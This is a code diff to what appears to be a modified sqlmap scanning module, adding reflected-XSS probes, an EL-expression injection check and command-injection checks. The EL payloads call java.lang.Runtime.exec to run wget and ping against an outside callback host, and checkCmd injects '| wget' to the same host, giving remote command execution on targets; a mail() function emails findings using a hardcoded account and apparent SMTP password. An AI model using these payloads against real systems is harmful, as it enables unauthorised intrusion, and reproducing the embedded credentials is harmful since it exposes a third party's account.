@@ -13,8 +13,10 @@ import socket
 import time
 import base64
 import string
-
+import traceback
 from subprocess import Popen as execute
+import smtplib
+from email.mime.text import MIMEText
 
 from extra.beep.beep import beep
 from lib.core.agent import agent
@@ -81,6 +83,7 @@ from lib.core.settings import URI_HTTP_HEADER
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.core.settings import CLOUDEYE
 from lib.core.settings import XSSPAYLOAD
+from lib.core.settings import ReflectXSSPAYLOAD
 from lib.core.threads import getCurrentThreadData
 from lib.request.connect import Connect as Request
 from lib.request.comparison import comparison
@@ -89,7 +92,74 @@ from lib.request.templates import getPageTemplate
 from lib.techniques.union.test import unionTest
 from lib.techniques.union.use import configUnion
 
+def mail(site,info):
+    _user = "xxx@foxmail.com"
+    _pwd = "akngxdvxeircbfae"
+    _to = "xxx@qq.com"
+    msg = MIMEText(info)
+    msg["Subject"] = site
+    msg["From"] = _user
+    msg["To"] = _to
+    try:
+        s = smtplib.SMTP("smtp.qq.com", port=587, timeout=30)
+        s.starttls()
+        s.ehlo()
+        s.esmtp_features['auth'] = 'LOGIN DIGEST-MD5 PLAIN'
+        s.login(_user, _pwd)
+        s.sendmail(_user, _to, msg.as_string())
+        s.close()
+    except:
+        f = open("error.log", 'a')
+        f.write(site+" : " + info + '\n')
+        f.close()
+
+def checkcontenttype():
+    _,info = Request.queryPage(content=True, raise404=False)
+    if "tml" in info["content-type"]:
+        return True
+    else:
+        return False
+def checkReflectXSS(place, parameter, value):
+    for payload in ReflectXSSPAYLOAD:
+        _payload = agent.payload(place, parameter, newValue=payload, where=1)
+        page, _ = Request.queryPage(_payload, place, content=True, raise404=False)
+        try:
+            testpage = page.lower()
+            if 'alert(18567)>' in testpage or 'alert(18567)/>' in testpage:
+                site = conf.hostname + "-----ReflectXSS"
+                info = "ReflectXSS: " + conf.url + "----->" + parameter
+                mail(site, info)
+                break
+        except:
+            f = open("xsserror.log", 'a')
+            traceback.print_exc(file=f)
+            f.flush()
+            f.close()
+
+
+# add check EL Expression
+def checkELE(place, parameter, value):
+    host = conf.hostname
+    payload1 = agent.payload(place, parameter, newValue='${135478-1215}', where=1)
+    match1 = '134263'
+    page, _ = Request.queryPage(payload1, place, content=True, raise404=False)
+    if match1 in page:
+        site = conf.hostname + "-----elexpression"
+        info = "elexpression: "+ conf.url + "----->" + parameter
+        mail(site, info)
+        print "get el expression exec"
+    cmd = '${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget '+ conf.hostname + ".ele" + CLOUDEYE + conf.path +'",null).getInputStream())}'
+    linuxpayload = agent.payload(place, parameter, newValue=cmd, where=1)
+    Request.queryPage(linuxpayload, place, raise404=False)
+    b64path = string.replace(base64.b64encode(conf.path), "=", "", 2)
+    wincmd =  '${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping -n 2 '+ conf.hostname + ".win.ele" + CLOUDEYE + conf.path +'",null).getInputStream())}'
+    # -n 1 option detect linux
+    winpayload = agent.payload(place, parameter, newValue=wincmd, where=1)
+    Request.queryPage(winpayload, place, raise404=False)
+
+
 #add check cmd
+
 def checkCmd(place, parameter, value):
     host = conf.hostname
     cmd = "| wget " + conf.hostname + ".cmd" + CLOUDEYE + conf.path + '/?-->' + parameter
